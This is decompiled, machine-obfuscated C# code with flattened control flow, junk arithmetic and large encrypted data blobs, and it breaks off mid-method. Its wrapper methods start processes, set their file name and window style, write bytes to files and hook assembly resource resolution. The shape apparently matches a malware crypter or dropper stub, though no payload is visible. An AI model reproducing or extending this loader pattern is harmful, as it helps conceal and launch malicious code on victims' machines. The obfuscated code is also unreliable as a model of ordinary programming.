using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.Serialization;
using System.Security.Policy;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.Devices;

internal sealed class Class36 : Computer
{
	internal sealed class Class37
	{
		internal sealed class Class38
		{
			internal static void tubwqamrPR<T>(object object_0, short short_0, short short_1)
			{
				byte[] byte_ = default(byte[]);
				int num = default(int);
				int num2 = default(int);
				try
				{
					byte_ = Class35.byte_1;
					num = 8;
					while (true)
					{
						num2 = 0;
						num = 4;
						while (true)
						{
							IL_00bb:
							switch (((short_1 ^ short_0) - 124) ^ num2)
							{
							case 1:
								num = byte_[265];
								goto IL_002d;
							case 0:
								num = 0;
								goto IL_001e;
							default:
								{
									num = byte_[148] - 231;
									goto IL_002d;
								}
								IL_002d:
								while (true)
								{
									switch (num)
									{
									case 1:
										num = byte_[3];
										continue;
									case 0:
										break;
									case 3:
									case 5:
									case 6:
										Monitor.Exit((T)object_0);
										goto case 10;
									case 10:
									{
										num2++;
										int num3 = short_0 * short_0 + short_0;
										Class35.byte_1[55] = (byte)((Class35.byte_1[55] | Class45.char_0[143]) & 0x8E);
										if (num3 % 2 != 0)
										{
											num = 7;
											goto case 7;
										}
										num = 2;
										return;
									}
									case 7:
									case 9:
										num = 4;
										goto IL_00bb;
									case 4:
										goto IL_00bb;
									default:
										goto end_IL_00c3;
									case 2:
										return;
									}
									break;
								}
								goto IL_001e;
								IL_001e:
								Monitor.Enter((T)object_0);
								num = byte_[3];
								goto IL_002d;
								end_IL_00c3:
								break;
							}
							break;
						}
					}
				}
				catch (Exception exception_)
				{
					int num4 = default(int);
					int num5 = default(int);
					int num6 = default(int);
					Class25.smethod_9(exception_, num2, num4, num, byte_, num5, num6, (T)object_0, short_0, short_1);
					throw;
				}
			}

			internal static void smethod_0<T, U>(object object_0, object object_1, int int_0, short short_0) where T : ProcessStartInfo where U : string
			{
				int num = default(int);
				int num2 = default(int);
				int num3 = default(int);
				int num4 = default(int);
				try
				{
					num = 1;
					num2 = 0;
					num = 5;
					switch (((short_0 ^ int_0) - 123) ^ 0)
					{
					default:
						num = 0;
						break;
					case 0:
						((ProcessStartInfo)object_0).FileName = (string)object_1;
						break;
					}
					num2++;
					num3 = 237;
					num4 = 615;
					num = 7;
				}
				catch (Exception exception_)
				{
					int num5 = default(int);
					int num6 = default(int);
					int num7 = default(int);
					Class25.smethod_11(exception_, new object[11]
					{
						num2, num4, num3, num5, num, num6, num7, object_0, object_1, int_0,
						short_0
					});
					throw;
				}
			}
		}

		internal sealed class Class39
		{
			internal static void smethod_0<T, U>(object object_0, object object_1, short short_0, char char_0) where T : ResolveEventHandler where U : AppDomain
			{
				byte[] byte_ = default(byte[]);
				int num = default(int);
				int num2 = default(int);
				try
				{
					byte_ = Class35.byte_1;
					num = 2;
					while (true)
					{
						num2 = 0;
						num = byte_[199] - 90;
						switch (num)
						{
						case 9:
							((AppDomain)object_0).ResourceResolve += (T)object_1;
							goto case 3;
						case 8:
							num = 0;
							goto case 0;
						case 0:
							switch (((char_0 ^ short_0) - 105) ^ num2)
							{
							case 0:
								goto IL_00a3;
							}
							num = 1;
							goto case 1;
						case 3:
						case 4:
							num2++;
							Class45.char_0[97] = (char)(Class45.char_0[97] & Class35.byte_1[176] & 'ÿ');
							if ((short_0 * short_0 + short_0) % 2 != 0)
							{
								num = 8;
								goto case 8;
							}
							num = 5;
							return;
						case 1:
						case 6:
							num = 4;
							goto case 3;
						case 5:
							return;
							IL_00a3:
							num = 9;
							goto case 9;
						}
					}
				}
				catch (Exception exception_)
				{
					int num3 = default(int);
					int num4 = default(int);
					int num5 = default(int);
					Class25.smethod_10(exception_, num2, num3, num, byte_, num4, num5, object_0, (T)object_1, short_0, char_0);
					throw;
				}
			}

			internal static byte[] smethod_1<T, U>(object object_0, object object_1, int int_0, char char_0) where T : Encoding where U : string
			{
				byte[] byte_ = default(byte[]);
				int num = default(int);
				int num2 = default(int);
				Array array = default(Array);
				int num3 = default(int);
				int num4 = default(int);
				try
				{
					byte_ = Class35.byte_1;
					while (true)
					{
						num = 0;
						num2 = 4;
						while (true)
						{
							IL_0093:
							switch (((int_0 ^ char_0) - 84) ^ num)
							{
							case 0:
								num2 = 2;
								while (true)
								{
									array = ((Encoding)object_0).GetBytes((string)object_1);
									num2 = byte_[197];
									switch (num2)
									{
									case 2:
									case 8:
										break;
									case 6:
										num2 = 4;
										goto IL_0093;
									case 7:
									case 10:
										goto end_IL_0010;
									case 9:
										goto IL_006c;
									case 0:
										goto IL_007c;
									case 4:
										goto IL_0093;
									default:
										num2 = 5;
										goto end_IL_009b;
									case 5:
										goto end_IL_009b;
									case 3:
										goto IL_00b3;
									}
									continue;
									end_IL_0010:
									break;
								}
								goto IL_0066;
							default:
								{
									num2 = 10;
									goto IL_0066;
								}
								IL_00b3:
								return array as byte[];
								IL_0066:
								array = null;
								num2 = 9;
								goto IL_006c;
								IL_006c:
								num++;
								num3 = 2466;
								num4 = 547;
								goto IL_007c;
								IL_007c:
								if (822 < num3 / 3 - num4)
								{
									num2 = 4;
									continue;
								}
								num2 = 3;
								goto IL_00b3;
								end_IL_009b:
								break;
							}
							break;
						}
					}
				}
				catch (Exception exception_)
				{
					int num5 = default(int);
					Class25.smethod_11(exception_, new object[11]
					{
						num, array, num3, num4, num5, num2, byte_, object_0, object_1, int_0,
						char_0
					});
					throw;
				}
			}

			internal static string smethod_2<T, U>(object object_0, object object_1, int int_0, char char_0) where T : string where U : string
			{
				char[] char_ = default(char[]);
				int num = default(int);
				int num2 = default(int);
				IEnumerable enumerable = default(IEnumerable);
				int num3 = default(int);
				try
				{
					char_ = Class45.char_0;
					while (true)
					{
						num = 0;
						num2 = 7;
						while (true)
						{
							switch (((char_0 ^ int_0) - 27) ^ num)
							{
							case 0:
								num2 = 6;
								goto IL_0087;
							default:
								{
									num2 = 2;
									goto IL_0024;
								}
								IL_0087:
								enumerable = (string?)object_0 + (string?)object_1;
								num2 = 5;
								goto IL_0076;
								IL_0076:
								num++;
								num3 = char_0 * char_0;
								num3 = char_0 + num3;
								num2 = 3;
								goto IL_006f;
								IL_006f:
								if (num3 % 2 != 0)
								{
									num2 = char_[274] - 23401;
									goto IL_0036;
								}
								num2 = 1;
								goto IL_00cc;
								IL_00cc:
								return enumerable as string;
								IL_0024:
								enumerable = null;
								num2 = char_[206] - 63988;
								goto IL_0036;
								IL_0036:
								switch (num2)
								{
								case 2:
									break;
								case 3:
									goto IL_006f;
								case 5:
								case 8:
									goto IL_0076;
								case 6:
									goto IL_0087;
								case 4:
								case 10:
									num2 = 7;
									continue;
								case 7:
									continue;
								default:
									num2 = 9;
									goto end_IL_00b3;
								case 0:
								case 9:
									goto end_IL_00b3;
								case 1:
									goto IL_00cc;
								}
								goto IL_0024;
								end_IL_00b3:
								break;
							}
							break;
						}
					}
				}
				catch (Exception exception_)
				{
					int num4 = default(int);
					Class25.smethod_10(exception_, num, enumerable, num3, num4, num2, char_, object_0, object_1, int_0, char_0);
					throw;
				}
			}

			internal static void smethod_3<T>(object object_0, byte[] byte_0, char char_0, int int_0) where T : string
			{
				char[] char_ = default(char[]);
				int num = default(int);
				int num2 = default(int);
				int num3 = default(int);
				int num4 = default(int);
				try
				{
					char_ = Class45.char_0;
					num = 1;
					while (true)
					{
						num2 = 0;
						num = char_[109] - 52105;
						while (true)
						{
							switch (num)
							{
							case 2:
							case 8:
								switch (((int_0 ^ char_0) - 48) ^ num2)
								{
								default:
									num = char_[98] - 39535;
									continue;
								case 0:
									break;
								}
								num = 6;
								goto case 6;
							case 6:
								File.WriteAllBytes((string)object_0, byte_0);
								goto case 0;
							case 0:
							case 3:
								num2++;
								num3 = 406;
								num4 = 102;
								goto case 7;
							case 7:
								num = ((203 < num3 / 2 - num4) ? (char_[205] - 42768) : (char_[54] - 62833));
								continue;
							case 4:
								num = char_[299] - 19529;
								continue;
							case 5:
								return;
							}
							break;
						}
					}
				}
				catch (Exception exception_)
				{
					int num5 = default(int);
					int num6 = default(int);
					int num7 = default(int);
					Class25.smethod_11(exception_, new object[12]
					{
						num2, num3, num4, num5, num, char_, num6, num7, object_0, byte_0,
						char_0, int_0
					});
					throw;
				}
			}

			internal static Assembly smethod_4(char char_0, short short_0)
			{
				byte[] byte_ = default(byte[]);
				int num = default(int);
				int num2 = default(int);
				ISerializable serializable = default(ISerializable);
				int num3 = default(int);
				int num4 = default(int);
				try
				{
					byte_ = Class35.byte_1;
					while (true)
					{
						num = 0;
						num2 = 7;
						while (true)
						{
							switch (((char_0 ^ short_0) - 122) ^ num)
							{
							case 0:
								num2 = byte_[269];
								while (true)
								{
									switch (num2)
									{
									case 4:
									case 6:
										serializable = Assembly.GetExecutingAssembly();
										num2 = byte_[155];
										continue;
									case 0:
										num2 = byte_[73] - 223;
										continue;
									case 7:
										break;
									default:
										num2 = 9;
										goto end_IL_006a;
									case 9:
										goto end_IL_006a;
									case 10:
										goto IL_0081;
									case 5:
										goto IL_0085;
									case 3:
									case 8:
										goto IL_0099;
									}
									break;
								}
								continue;
							default:
								{
									num2 = 10;
									goto IL_0081;
								}
								IL_0099:
								return (Assembly)serializable;
								IL_0081:
								serializable = null;
								num2 = 5;
								goto IL_0085;
								IL_0085:
								num++;
								num3 = 723;
								num4 = 203;
								num2 = 8;
								goto IL_0099;
								end_IL_006a:
								break;
							}
							break;
						}
					}
				}
				catch (Exception exception_)
				{
					int num5 = default(int);
					Class25.smethod_9(exception_, num, serializable, num3, num4, num5, num2, byte_, char_0, short_0);
					throw;
				}
			}
		}

		internal static bool smethod_0<T>(object object_0, char char_0, short short_0) where T : Process
		{
			byte[] byte_ = default(byte[]);
			char[] char_ = default(char[]);
			int num = default(int);
			int num2 = default(int);
			int num4 = default(int);
			int num3 = default(int);
			bool flag = default(bool);
			try
			{
				byte_ = Class35.byte_1;
				char_ = Class45.char_0;
				while (true)
				{
					num = 0;
					num2 = byte_[97] - 202;
					while (true)
					{
						switch (num2)
						{
						case 8:
						case 11:
							num++;
							num4 = 313;
							num3 = 358;
							goto case 5;
						case 5:
							num2 = ((2864 > num3 - num4 * 8) ? (char_[294] - 49599) : byte_[265]);
							continue;
						case 9:
							num2 = char_[300] - 14701;
							continue;
						case 7:
							flag = true;
							num2 = 8;
							goto case 8;
						case 2:
						case 6:
							num2 = 1;
							goto case 1;
						case 1:
							switch (((short_0 ^ char_0) - 38) ^ num)
							{
							case 0:
								goto IL_0080;
							}
							num2 = 7;
							goto case 7;
						case 4:
							flag = ((Process)object_0).Start();
							num2 = 8;
							goto case 8;
						default:
							num2 = 0;
							break;
						case 0:
							break;
						case 3:
							{
								return flag;
							}
							IL_0080:
							num2 = 4;
							goto case 4;
						}
						break;
					}
				}
			}
			catch (Exception exception_)
			{
				int num5 = default(int);
				Class25.smethod_11(exception_, new object[11]
				{
					num, flag, num3, num4, num5, num2, byte_, char_, object_0, char_0,
					short_0
				});
				throw;
			}
		}

		internal static StringBuilder smethod_1<T>(object object_0, char char_0, char char_1, int int_0) where T : StringBuilder
		{
			char[] char_2 = default(char[]);
			byte[] byte_ = default(byte[]);
			int num = default(int);
			int num2 = default(int);
			int num3 = default(int);
			int num4 = default(int);
			ISerializable serializable = default(ISerializable);
			try
			{
				char_2 = Class45.char_0;
				byte_ = Class35.byte_1;
				while (true)
				{
					num = 0;
					num2 = char_2[121] - 62448;
					while (true)
					{
						switch (num2)
						{
						case 0:
						case 3:
						case 10:
							num++;
							num3 = 1200;
							num4 = 39;
							num2 = char_2[200] - 59780;
							continue;
						case 9:
							serializable = ((StringBuilder)object_0).Append(char_0);
							num2 = 10;
							goto case 0;
						case 8:
							serializable = null;
							goto case 2;
						case 2:
							num2 = byte_[3];
							continue;
						case 7:
							num2 = byte_[209] - byte_[68];
							continue;
						case 1:
							switch (((char_1 ^ int_0) - 2) ^ num)
							{
							case 0:
								num2 = byte_[197];
								continue;
							}
							num2 = 8;
							goto case 8;
						default:
							num2 = 4;
							break;
						case 4:
							break;
						case 5:
							return (StringBuilder)serializable;
						}
						break;
					}
				}
			}
			catch (Exception exception_)
			{
				int num5 = default(int);
				Class25.smethod_11(exception_, new object[12]
				{
					num, serializable, num3, num4, num5, num2, char_2, byte_, object_0, char_0,
					char_1, int_0
				});
				throw;
			}
		}

		internal static void smethod_2<T>(object object_0, ProcessWindowStyle processWindowStyle_0, short short_0, short short_1) where T : ProcessStartInfo
		{
			byte[] byte_ = default(byte[]);
			char[] char_ = default(char[]);
			int num = default(int);
			int num2 = default(int);
			try
			{
				byte_ = Class35.byte_1;
				char_ = Class45.char_0;
				num = 0;
				while (true)
				{
					num2 = 0;
					num = byte_[185];
					while (true)
					{
						switch (num)
						{
						case 3:
						case 9:
							num2++;
							num = (((short_1 * short_1 + short_1) % 2 == 0) ? (byte_[36] - 30) : (char_[44] - 44105));
							continue;
						case 6:
							num = 2;
							goto case 2;
						case 2:
						case 5:
							num = (((short_0 ^ short_1) - 20) ^ num2) switch
							{
								0 => byte_[95] - 62, 
								_ => char_[340] - 51911, 
							};
							continue;
						case 4:
							num = 9;
							goto case 3;
						case 1:
							((ProcessStartInfo)object_0).WindowStyle = processWindowStyle_0;
							goto case 3;
						case 8:
							return;
						}
						break;
					}
				}
			}
			catch (Exception exception_)
			{
				int num3 = default(int);
				int num4 = default(int);
				int num5 = default(int);
				Class25.smethod_11(exception_, new object[11]
				{
					num2, num3, num, byte_, char_, num4, num5, object_0, processWindowStyle_0, short_0,
					short_1
				});
				throw;
			}
		}

		internal static Encoding smethod_3(short short_0, int int_0)
		{
			byte[] byte_ = default(byte[]);
			char[] char_ = default(char[]);
			int num = default(int);
			int num2 = default(int);
			ICloneable cloneable = default(ICloneable);
			int num3 = default(int);
			int num4 = default(int);
			try
			{
				byte_ = Class35.byte_1;
				char_ = Class45.char_0;
				while (true)
				{
					num = 0;
					num2 = char_[51] - char_[51];
					while (true)
					{
						switch (num2)
						{
						default:
							num2 = byte_[244] - byte_[256];
							continue;
						case 5:
							cloneable = null;
							num2 = char_[173] - 41450;
							continue;
						case 3:
							num2 = 0;
							goto case 0;
						case 0:
							switch (((int_0 ^ short_0) - 77) ^ num)
							{
							case 0:
								goto IL_008d;
							}
							num2 = 5;
							goto case 5;
						case 9:
							break;
						case 10:
							cloneable = Encoding.UTF8;
							num2 = 6;
							goto case 2;
						case 2:
						case 6:
							num++;
							num3 = 1532;
							num4 = 208;
							num2 = 4;
							goto case 1;
						case 1:
						case 4:
						case 7:
							{
								return cloneable as Encoding;
							}
							IL_008d:
							num2 = 10;
							goto case 10;
						}
						break;
					}
				}
			}
			catch (Exception exception_)
			{
				int num5 = default(int);
				Class25.smethod_10(exception_, num, cloneable, num3, num4, num5, num2, byte_, char_, short_0, int_0);
				throw;
			}
		}

		internal static Evidence smethod_4<T>(object object_0, char char_0, char char_1) where T : Assembly
		{
			byte[] byte_ = default(byte[]);
			char[] char_2 = default(char[]);
			int num = default(int);
			int num2 = default(int);
			object obj = default(object);
			int num3 = default(int);
			try
			{
				byte_ = Class35.byte_1;
				char_2 = Class45.char_0;
				while (true)
				{
					num = 0;
					num2 = byte_[171] - byte_[260];
					while (true)
					{
						switch (num2)
						{
						case 11:
							switch (((char_1 ^ char_0) - 105) ^ num)
							{
							case 0:
								goto IL_004e;
							}
							num2 = 2;
							goto case 2;
						case 2:
							obj = null;
							num2 = 7;
							goto case 3;
						case 4:
						case 8:
							if (num3 % 2 != 0)
							{
								num2 = 11;
								goto case 11;
							}
							num2 = 10;
							goto case 10;
						case 3:
						case 7:
							num++;
							num3 = char_0 * char_0;
							num3 = char_0 + num3;
							num2 = 8;
							goto case 4;
						default:
							num2 = byte_[197];
							continue;
						case 5:
							num2 = byte_[233] - 23;
							continue;
						case 1:
							obj = ((Assembly)object_0).get_Evidence();
							num2 = 7;
							goto case 3;
						case 9:
							break;
						case 10:
							{
								return (Evidence)obj;
							}
							IL_004e:
							num2 = char_2[253] - 26210;
							continue;
						}
						break;
					}
				}
			}
			catch (Exception exception_)
			{
				int num4 = default(int);
				Class25.smethod_10(exception_, num, obj, num3, num4, num2, byte_, char_2, object_0, char_0, char_1);
				throw;
			}
		}

		internal static string smethod_5<T>(object object_0, short short_0, char char_0) where T : ResolveEventArgs
		{
			char[] char_ = default(char[]);
			byte[] byte_ = default(byte[]);
			int num = default(int);
			int num2 = default(int);
			IEnumerable enumerable = default(IEnumerable);
			int num3 = default(int);
			int num4 = default(int);
			try
			{
				char_ = Class45.char_0;
				byte_ = Class35.byte_1;
				while (true)
				{
					num = 0;
					num2 = 1;
					while (true)
					{
						IL_00b3:
						switch (((char_0 ^ short_0) - 95) ^ num)
						{
						case 0:
							num2 = 9;
							goto IL_0090;
						default:
							{
								num2 = 5;
								goto IL_0038;
							}
							IL_0090:
							enumerable = ((ResolveEventArgs)object_0).Name;
							num2 = char_[182] - 43700;
							goto IL_005b;
							IL_005b:
							while (true)
							{
								switch (num2)
								{
								case 8:
									break;
								case 4:
								case 5:
								case 6:
									goto IL_0038;
								case 0:
									goto IL_003d;
								case 2:
									num2 = (int)byte_[134] / 3;
									continue;
								case 9:
									goto IL_0090;
								case 1:
									goto IL_00b3;
								default:
									num2 = 7;
									goto end_IL_00bb;
								case 7:
									goto end_IL_00bb;
								case 3:
									goto IL_00d3;
								}
								break;
							}
							goto IL_001a;
							IL_0038:
							enumerable = null;
							num2 = 0;
							goto IL_003d;
							IL_003d:
							num++;
							num3 = 1770;
							num4 = 764;
							goto IL_001a;
							IL_001a:
							if (885 < num3 / 2 - num4)
							{
								num2 = char_[103] - 60903;
								goto IL_005b;
							}
							num2 = 3;
							goto IL_00d3;
							IL_00d3:
							return enumerable as string;
							end_IL_00bb:
							break;
						}
						break;
					}
				}
			}
			catch (Exception exception_)
			{
				int num5 = default(int);
				Class25.smethod_11(exception_, new object[11]
				{
					num, enumerable, num3, num4, num5, num2, char_, byte_, object_0, short_0,
					char_0
				});
				throw;
			}
		}

		internal static void smethod_6<T>(object object_0, byte[] byte_0, int int_0, int int_1, int int_2, char char_0) where T : Stream
		{
			byte[] byte_ = default(byte[]);
			int num = default(int);
			int num2 = default(int);
			try
			{
				byte_ = Class35.byte_1;
				num = 1;
				while (true)
				{
					num2 = 0;
					num = 5;
					while (true)
					{
						Class35.byte_1[78] = (byte)((Class35.byte_1[78] | int_0) & 0x3D);
						switch (((int_2 ^ char_0) - 85) ^ num2)
						{
						case 0:
							num = 9;
							goto IL_0011;
						default:
							{
								num = byte_[185];
								switch (num)
								{
								case 4:
								case 9:
									break;
								case 3:
									goto IL_001f;
								case 0:
									goto IL_0030;
								case 2:
									num = 3;
									goto IL_001f;
								case 5:
								case 7:
									continue;
								default:
									goto end_IL_008f;
								case 6:
								case 8:
									return;
								}
								goto IL_0011;
							}
							IL_0011:
							((Stream)object_0).Write(byte_0, int_0, int_1);
							goto IL_001f;
							IL_001f:
							num2++;
							if ((char_0 * char_0 + char_0) % 2 != 0)
							{
								num = 0;
								goto IL_0030;
							}
							num = 6;
							return;
							IL_0030:
							num = 5;
							continue;
							end_IL_008f:
							break;
						}
						break;
					}
				}
			}
			catch (Exception exception_)
			{
				int num3 = default(int);
				int num4 = default(int);
				int num5 = default(int);
				Class25.smethod_11(exception_, new object[12]
				{
					num2, num3, num, byte_, num4, num5, object_0, byte_0, int_0, int_1,
					int_2, char_0
				});
				throw;
			}
		}

		internal static void smethod_7<T, U, V>(object object_0, object object_1, object object_2, int int_0, short short_0) where T : AppDomain where V : string
		{
			char[] char_ = default(char[]);
			byte[] byte_ = default(byte[]);
			int num = default(int);
			int num2 = default(int);
			int num3 = default(int);
			int num4 = default(int);
			try
			{
				char_ = Class45.char_0;
				byte_ = Class35.byte_1;
				num = 1;
				while (true)
				{
					num2 = 0;
					num = 5;
					while (true)
					{
						IL_00c8:
						switch (((int_0 ^ short_0) - 116) ^ num2)
						{
						case 0:
							num = 8;
							goto IL_00a0;
						default:
							{
								num = char_[60] - 10973;
								goto IL_004a;
							}
							IL_00a0:
							((AppDomain)object_0).SetData((string)object_1, (object?)(U)object_2);
							goto IL_008e;
							IL_008e:
							num2++;
							num3 = 461;
							num4 = 989;
							goto IL_0080;
							IL_0080:
							if (5934 > num4 - num3 * 6)
							{
								num = byte_[40] - 14;
								goto IL_004a;
							}
							num = 6;
							goto IL_002b;
							IL_004a:
							while (true)
							{
								switch (num)
								{
								case 6:
									break;
								case 0:
									num = byte_[244] - 117;
									continue;
								case 9:
									goto IL_0080;
								case 4:
								case 7:
									goto IL_008e;
								case 8:
									goto IL_00a0;
								case 5:
									goto IL_00c8;
								default:
									goto end_IL_00d1;
								case 2:
									return;
								}
								break;
							}
							goto IL_002b;
							IL_002b:
							num = char_[150] - 62861;
							goto IL_004a;
							end_IL_00d1:
							break;
						}
						break;
					}
				}
			}
			catch (Exception exception_)
			{
				int num5 = default(int);
				int num6 = default(int);
				int num7 = default(int);
				Class25.smethod_11(exception_, new object[14]
				{
					num2,
					num4,
					num3,
					num5,
					num,
					char_,
					byte_,
					num6,
					num7,
					object_0,
					object_1,
					(U)object_2,
					int_0,
					short_0
				});
				throw;
			}
		}
	}

	internal static Struct11 struct11_0/* Not supported: data(3E 03 20 65 39 BD 67 CE 20 D2 C9 14 2B 9A C3 51 BA A6 C9 E5 89 82 E9 C0 6C 99 5C 65 B9 CC 6C B4 EE E2 59 26 D9 C1 49 29 E4 56 A1 3E 6A A3 F3 B6 F4 FE E2 15 4F 62 4E BB 18 5E F7 9E 61 02 14 52 65 14 25 47 40 9C 76 F8 5C 9F 01 33 DF AB 56 C7 A4 A4 6F BA E9 56 65 8B 94 9D 0E 7B C8 A9 C7 E2 41 4F D7 56 7E AB 75 57 88 E8 B8 AE 61 1A DA 6C 08 30 F8 BB 91 59 68 0F AD 99 B2 A2 8E FA 2F B1 D7 1E F0 90 D2 00 49 F8 2F 18 32 00 9D B6 29 79 C2 A0 72 98 B0 0C 50 E7 E5 C8 A7 E3 F8 D2 C7 8D B8 06 D5 43 29 49 98 08 E5 00 8B 78 26 67 71 F5 6F 38 DE ED 87 95 01 CB CC 08 A9 0A 57 64 FE 5C 50 A4 46 96 DF E5 50 78 07 6A B2 AF 7F D6 C0 7D 56 B1 74 C0 F2 D9 05 23 05 0A 76 20 9E 8D AF 80 00 2F 28 81 21 D9 15 88 E6 66 E5 1C E2 50 4B F4 47 2B B2 A5 EF 3E 69 76 9E 23 91 D5 6F 30 D8 79 BA 31 AE 50 AE 3F 5C 7C 9B EA D8 8B F2 E8 3F B3 BD 80 D8 72 DA 0A 90 C1 C4 B1 E1 FC 47 3F 19 B6 8C 6C 61 B0 A0 FA 46 07 CD 36 0A 04 64 DC 82 B5 E3 DD 18 ED 57 65 9E B0 A0 EC 8A FB 5D 5F 34 5C D1 22 FD 86 86 8D 12 C1 3A D0 A4 A3 FE 8B 5D E6 2F 2C 18 69 26 2A 5F 26 CD B0 10 B3 6F 49 A9 6E 01 AD 31 42 DD FA 2E 55 CA 55 B3 85 C0 F9 B0 14 8F A3 CC 30 46 C9 35 A7 C2 D7 B8 D5 7D 5E 52 EF 27 35 A1 51 59 1A 08 33 FC C2 9E D0 75 D8 65 D2 FE FA 24 CB 7B 78 27 36 77 89 7E 06 42 58 D7 6C 03 C2 5D 8A 57 5E BA 74 9A 99 33 83 2B 63) */;

	internal static byte[] byte_0;

	internal static Struct15 struct15_0/* Not supported: data(54 34 00 00 40 58 00 00 E9 51 00 00 C7 4C 00 00 4F 1E 00 00 7C D0 00 00 0A 3A 00 00 86 91 00 00 59 63 00 00 6D EE 00 00 40 99 00 00 71 81 00 00 E4 49 00 00 64 00 00 00 CB CB 00 00 89 DB 00 00 B3 BB 00 00 3E 77 00 00 79 67 00 00 81 4E 00 00 FA 37 00 00 E2 08 00 00 BA E2 00 00 B8 65 00 00 9E E7 00 00 AF D7 00 00 B6 C2 00 00 9E 77 00 00 3C 2D 00 00 86 F6 00 00 D4 F8 00 00 A3 61 00 00 63 DA 00 00 4A 24 00 00 82 5B 00 00 0E 0F 00 00 32 6B 00 00 97 6B 00 00 21 27 00 00 7A 9B 00 00 E9 70 00 00 1C CB 00 00 2E 84 00 00 3F 25 00 00 86 3F 00 00 A8 5F 00 00 0F F3 00 00 76 64 00 00 1B 09 00 00 83 DB 00 00 0A 32 00 00 69 44 00 00 D2 26 00 00 DA AC 00 00 90 E3 00 00 71 2B 00 00 84 75 00 00 30 EC 00 00 28 65 00 00 9E 46 00 00 C5 0D 00 00 6A C2 00 00 4A 64 00 00 D2 6C 00 00 97 F5 00 00 9D 37 00 00 0D A7 00 00 99 25 00 00 E0 A4 00 00 BC BC 00 00 57 70 00 00 1C 50 00 00 1C 50 00 00 FD CB 00 00 97 DD 00 00 DC 6C 00 00 B2 84 00 00 7A BD 00 00 31 26 00 00 F5 87 00 00 9E E4 00 00 3F 5E 00 00 83 6E 00 00 B7 51 00 00 7B C4 00 00 6A B4 00 00 D0 3A 00 00 89 2D 00 00 B9 40 00 00 10 30 00 00 88 99 00 00 01 7F 00 00 6F 06 00 00 82 E0 00 00 B4 8D 00 00 7D AE 00 00 D2 66 00 00 5C 17 00 00 A6 2F 00 00 E9 07 00 00 9A B8 00 00 76 CD 00 00 95 BF 00 00 5D 4C 00 00 2B 6B 00 00 ED E1 00 00 4B F4 00 00 D3 5A 00 00 41 CF 00 00 B3 76 00 00 BE A6 00 00 09 B8 00 00 FE C5 00 00 31 DD 00 00 FE 61 00 00 85 AF 00 00 E7 53 00 00 92 12 00 00 55 A8 00 00 2D 41 00 00 CC FC 00 00 84 79 00 00 DE E4 00 00 CF 74 00 00 33 23 00 00 55 F1 00 00 AC 49 00 00 99 6F 00 00 48 3E 00 00 1A 2F 00 00 09 06 00 00 56 6D 00 00 D3 8D 00 00 48 1E 00 00 5A CF 00 00 28 17 00 00 A9 9E 00 00 25 22 00 00 8B E6 00 00 8C E2 00 00 1D C0 00 00 FB DF 00 00 46 5E 00 00 05 CA 00 00 51 89 00 00 7E E1 00 00 01 B9 00 00 3D 29 00 00 83 7E 00 00 2E DE 00 00 96 5A 00 00 40 54 00 00 05 6F 00 00 78 EE 00 00 1C 0B 00 00 15 3F 00 00 96 E8 00 00 C5 4A 00 00 29 29 00 00 D5 79 00 00 40 98 00 00 B2 84 00 00 8B 1C 00 00 27 A0 00 00 A9 70 00 00 67 39 00 00 35 2A 00 00 B6 A7 00 00 D6 0D 00 00 D6 4A 00 00 DC 10 00 00 C1 31 00 00 05 2C 00 00 C8 C5 00 00 0E 81 00 00 D0 1C 00 00 3D 1B 00 00 D9 1A 00 00 7D EB 00 00 B4 41 00 00 53 38 00 00 6F 20 00 00 15 F1 00 00 19 60 00 00 82 D4 00 00 C8 B1 00 00 50 FE 00 00 5A 9F 00 00 2B 13 00 00 44 90 00 00 90 2E 00 00 E4 53 00 00 FA F8 00 00 B5 6C 00 00 4C 4A 00 00 6B 3B 00 00 70 C3 00 00 1E BE 00 00 5C 59 00 00 EA 4F 00 00 48 B7 00 00 4B 11 00 00 66 1B 00 00 AD 33 00 00 52 CD 00 00 D4 28 00 00 3A 28 00 00 3C A9 00 00 6A 6D 00 00 4A EE 00 00 D8 23 00 00 BD CD 00 00 46 5F 00 00 74 E7 00 00 82 41 00 00 D0 77 00 00 9C 93 00 00 70 BC 00 00 A3 CB 00 00 DF BE 00 00 16 3B 00 00 DA 8A 00 00 8A 94 00 00 91 7D 00 00 45 1C 00 00 F7 BC 00 00 C6 38 00 00 4F BF 00 00 7B 7B 00 00 A3 45 00 00 5F 59 00 00 1D 5D 00 00 7C C1 00 00 93 9B 00 00 6A 8A 00 00 07 27 00 00 09 05 00 00 68 BD 00 00 C5 92 00 00 AE AB 00 00 8E 89 00 00 13 55 00 00 EF 31 00 00 DF 24 00 00 6C 6C 00 00 D1 60 00 00 9C F4 00 00 86 11 00 00 33 2B 00 00 7A D2 00 00 CE A7 00 00 FF 06 00 00 7A F2 00 00 7B 9A 00 00 D3 14 00 00 6E 2C 00 00 C0 7C 00 00 D4 9D 00 00 67 17 00 00 5B 10 00 00 0C F0 00 00 EA 68 00 00 C0 2D 00 00 C7 27 00 00 EB 94 00 00 B9 C6 00 00 41 0C 00 00 B2 C3 00 00 09 5D 00 00 7A 1A 00 00 C7 72 00 00 33 D6 00 00 AA 29 00 00 F4 1F 00 00 51 35 00 00 01 E6 00 00 EA 58 00 00 AA 6F 00 00 24 11 00 00 73 BB 00 00 5A C8 00 00 40 27 00 00 1C 94 00 00 00 A9 00 00 D3 9D 00 00 60 52 00 00 A2 6A 00 00 00 27 00 00) */;

	internal static int[] int_0;

	public Class36()
	{
		Class52.KPUgGmhz2nAeI();
		((Computer)this)._002Ector();
		try
		{
		}
		catch (Exception exception_)
		{
			Class25.smethod_1(exception_, this);
			throw;
		}
	}

	internal static ProcessStartInfo smethod_0<T>(object object_0, short short_0, int int_1) where T : Process
	{
		byte[] byte_ = default(byte[]);
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		object obj = default(object);
		try
		{
			byte_ = Class35.byte_1;
			while (true)
			{
				num = 0;
				num2 = byte_[185];
				while (true)
				{
					switch (num2)
					{
					case 5:
					case 11:
						num2 = 9;
						goto case 9;
					case 9:
						num++;
						num3 = short_0 * short_0;
						num3 = short_0 + num3;
						num2 = 0;
						goto case 0;
					case 0:
						if (num3 % 2 != 0)
						{
							num2 = byte_[185] - 0;
							continue;
						}
						num2 = 8;
						goto case 8;
					case 10:
						obj = ((Process)object_0).StartInfo;
						num2 = 9;
						goto case 9;
					case 3:
						obj = null;
						goto case 5;
					case 2:
						switch (((int_1 ^ short_0) - 80) ^ num)
						{
						case 0:
							num2 = byte_[3];
							continue;
						}
						num2 = 3;
